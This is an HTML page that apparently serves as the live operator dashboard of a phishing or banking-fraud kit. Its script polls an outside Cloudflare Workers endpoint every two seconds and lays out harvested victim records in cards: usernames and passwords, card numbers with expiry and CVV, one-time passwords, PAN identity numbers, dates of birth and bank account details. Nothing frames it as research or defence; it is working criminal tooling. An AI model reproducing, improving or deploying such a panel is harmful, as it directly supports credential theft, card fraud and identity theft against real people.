<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Logs - White</title>
    <style>
        body { background: #f4f7f6; color: #333; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 12px; }
        
        /* Top Header Style */
        .top-header { text-align: center; margin-bottom: 20px; padding: 10px 0; border-bottom: 1px dashed #ccc; }
        .live-text { font-size: 24px; font-weight: 900; color: #000; letter-spacing: 2px; margin: 0; }
        .sub-text { font-size: 12px; font-weight: 600; color: #d32f2f; margin: 2px 0 0 0; text-transform: lowercase; }

        .card { 
            background: #ffffff; 
            border: 1px solid #e0e0e0; 
            border-top: 4px solid #971237; 
            border-radius: 10px; 
            margin-bottom: 15px; 
            padding: 15px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }
        .header { display: flex; justify-content: space-between; border-bottom: 1px solid #f0f0f0; padding-bottom: 10px; margin-bottom: 10px; }
        .id { color: #999; font-size: 11px; font-weight: bold; }
        .type { background: #971237; color: #fff; padding: 2px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; text-transform: uppercase; }
        .data-row { margin-bottom: 10px; }
        .label { color: #888; font-size: 10px; display: block; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 2px; }
        .val { color: #1a1a1a; word-break: break-all; font-weight: 600; font-size: 15px; }
        .otp { color: #d32f2f; font-size: 22px; letter-spacing: 3px; font-weight: 800; border-left: 3px solid #d32f2f; padding-left: 10px; margin: 5px 0; }
        .card-info { color: #c62828; font-family: monospace; font-size: 16px; }
        .time { color: #bbb; font-size: 10px; text-align: right; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="top-header">
        <h1 class="live-text">LIVE</h1>
        <p class="sub-text">show data here.</p>
    </div>

    <div id="logs"></div>

    <script>
        const API = 'https://snowy-sunset-a557.sumankkuuyy.workers.dev/';

        async function fetchLogs() {
            try {
                const r = await fetch(API);
                const data = await r.json();
                
                document.getElementById('logs').innerHTML = data.map(l => `
                    <div class="card">
                        <div class="header">
                            <span class="id">ID: #${l.id}</span>
                            <span class="type">${l.type}</span>
                        </div>
                        
                        ${(l.user_id || l.password) ? `
                        <div class="data-row">
                            <span class="label">Login Credentials</span>
                            <span class="val">${l.user_id || ''}</span>
                            <div class="val" style="color:#666; font-size:13px;">Pass: ${l.password || ''}</div>
                        </div>` : ''}

                        ${(l.card_no) ? `
                        <div class="data-row">
                            <span class="label">Card Details</span>
                            <div class="card-info">${l.card_no || ''}</div>
                            <div class="val" style="font-size:13px;">EXP: ${l.expiry || ''} | CVV: ${l.cvv || ''}</div>
                        </div>` : ''}

                        ${(l.otp1 || l.otp2 || l.otp3) ? `
                        <div class="data-row">
                            <span class="label">OTP Received</span>
                            <div class="otp">${l.otp1 || ''} ${l.otp2 || ''} ${l.otp3 || ''}</div>
                        </div>` : ''}

                        ${(l.pan_no || l.dob) ? `
                        <div class="data-row">
                            <span class="label">Identity Info</span>
                            <span class="val">PAN: ${l.pan_no || ''}</span>
                            <div class="val" style="font-size:13px; color:#666;">DOB: ${l.dob || ''}</div>
                        </div>` : ''}

                        ${(l.account_no || l.full_name) ? `
                        <div class="data-row">
                            <span class="label">Bank Account</span>
                            <span class="val">${l.full_name || ''}</span>
                            <div class="val" style="font-size:13px; color:#666;">A/C: ${l.account_no || ''}</div>
                        </div>` : ''}

                        <div class="time">${new Date(l.created_at).toLocaleString()}</div>
                    </div>
                `).join('');
            } catch (e) {
                console.log("Error fetching data");
            }
        }

        setInterval(fetchLogs, 2000);
        fetchLogs();
    </script>
</body>
</html>
